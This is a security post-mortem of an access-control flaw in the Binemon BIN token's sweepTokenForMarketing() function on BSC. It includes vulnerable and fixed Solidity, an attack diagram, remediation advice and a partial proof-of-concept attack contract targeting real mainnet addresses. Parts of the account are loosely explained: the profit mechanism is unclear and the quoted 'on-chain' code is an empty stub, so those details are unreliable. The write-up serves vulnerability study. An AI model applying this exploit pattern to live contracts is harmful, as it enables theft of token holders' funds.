# Binemon — sweepTokenForMarketing Missing Access Control Analysis

| Field | Details |
|------|------|
| **Date** | 2024-03 |
| **Protocol** | Binemon (BIN) |
| **Chain** | BSC |
| **Loss** | ~0.2 BNB |
| **Attacker** | [0x835b45d3](https://bscscan.com/address/0x835b45d38cbdccf99e609436ff38e31ac05bc502) |
| **Attack Contract** | [0x132e1ea5](https://bscscan.com/address/0x132e1ea5db918dae00eef685b845c409a83dfa82) |
| **Vulnerable Contract** | [BIN 0xe56842Ed](https://bscscan.com/address/0xe56842Ed550Ff2794F010738554db45E60730371) |
| **Root Cause** | `sweepTokenForMarketing()` has no access control, allowing anyone to call it repeatedly to drain the contract's BIN tokens and convert them to BNB via PancakeSwap |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/Binemon_exp.sol) |

---

## 1. Vulnerability Overview

The `sweepTokenForMarketing()` function of the Binemon BIN token is designed to transfer BIN tokens accumulated in the contract for marketing purposes. Due to missing access control, anyone can call it repeatedly to drain the BIN tokens. The attacker exploited this by calling it repeatedly and converting the proceeds to BNB via PancakeSwap.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: sweepTokenForMarketing has no access control
function sweepTokenForMarketing() external {
    // No onlyOwner or onlyMarketing modifier
    uint256 contractBalance = balanceOf(address(this));
    if (contractBalance > 0) {
        _transfer(address(this), marketingWallet, contractBalance);
    }
}

// Even more dangerous if marketingWallet is not msg.sender but a hardcoded address,
// or if the destination can be specified as sweepTo(address)

// ✅ Safe code: only owner can call
function sweepTokenForMarketing() external onlyOwner {
    uint256 contractBalance = balanceOf(address(this));
    require(contractBalance > 0, "nothing to sweep");
    _transfer(address(this), marketingWallet, contractBalance);
    emit MarketingSweep(contractBalance);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Binemon_decompiled.sol
contract Binemon {
    function sweepTokenForMarketing() external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Swap WBNB → BIN (acquire initial position)
  │
  ├─→ [2] Repeatedly call sweepTokenForMarketing()
  │         └─ Drain contract BIN balance
  │
  ├─→ [3] Wait for external users to buy BIN (price increases)
  │
  ├─→ [4] Swap accumulated BIN → WBNB
  │
  └─→ [5] ~0.2 BNB profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IBIN {
    function sweepTokenForMarketing() external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract AttackContract {
    IBIN          constant bin    = IBIN(0xe56842Ed550Ff2794F010738554db45E60730371);
    IPancakeRouter constant router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20        constant WBNB   = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    function testExploit() external {
        // [1] Initial WBNB → BIN swap
        swapWBNBtoBIN(initialAmount);

        // [2] Repeatedly call sweepTokenForMarketing to drain contract balance
        while (bin.balanceOf(address(bin)) > 0) {
            bin.sweepTokenForMarketing();
        }

        // [3] Swap accumulated BIN → WBNB
        uint256 binBal = bin.balanceOf(address(this));
        bin.approve(address(router), binBal);
        swapBINtoWBNB(binBal);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing Access Control |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (direct repeated calls to sweepTokenForMarketing) |
| **DApp Category** | ERC20 token marketing function |
| **Impact** | Theft of tokens held by the contract |

## 6. Remediation Recommendations

1. **Apply onlyOwner**: Restrict `sweepTokenForMarketing()` to owner-only access
2. **Fix marketing wallet address**: Hardcode the sweep destination and make it immutable
3. **Maintain minimum balance**: Enforce a minimum buffer to remain after sweeping
4. **Event logging**: Emit events recording the amount and caller on each sweep execution for monitoring

## 7. Lessons Learned

- Token sweep functions intended for marketing or administrative purposes must only be callable by authorized addresses.
- Even a small-scale attack (~$200), the structural flaw of missing access control becomes catastrophic in larger pools.
- Every mechanism that accumulates tokens in a contract requires thorough review of the access control on the corresponding withdrawal function.